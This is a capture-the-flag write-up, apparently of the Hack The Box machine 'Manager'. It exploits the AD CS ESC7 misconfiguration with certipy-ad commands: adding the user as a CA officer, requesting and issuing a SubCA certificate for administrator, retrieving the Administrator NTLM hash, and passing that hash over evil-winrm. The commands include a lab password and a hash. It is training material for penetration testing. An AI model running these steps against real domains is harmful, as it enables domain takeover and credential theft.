
ESC7 is when a user has either the “Manage CA” or “Manage Certificates” access rights on the certificate authority itself.

---

1. To exploit this I need to add user "Raven" as "Officer", so that we can manage certificates.

```
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.55.175 -ca manager-dc01-ca -add-officer raven -debug
```

Now that we are officer, we can issue and manage certificates. 

2. The first step is to request a certificate based on the Subordinate Certification Authority (SubCA) template provided by ADCS. The SubCA template serves as a predefined set of configurations and policies governing the issuance of certificates. 

**WARNING:** Even if this fails, save the key on your local machine to proceed.
```
certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

3. Then using the Manage CA and Manage Certificates privileges, I’ll use the ca subcommand to issue the request:

**WARNING**: Utilize the number of the key for the --issue-request parameter.
```
certipy-ad ca -ca manager-DC01-CA -issue-request 20 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

4. Retrieve the administrator certificate.

**WARNING**: Utilize the number of the key for the -retrieve parameter.
```
certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 20 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

5. Authenticate against the CA as Administrator to harvest NTLM Hash.

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.55.175
```

Connected to the Domain Controller as Administrator user via evil-winrm.

```
evil-winrm -i dc01.manager.htb -u Administrator -H ae5064c2f62317332c88629e025924ef
```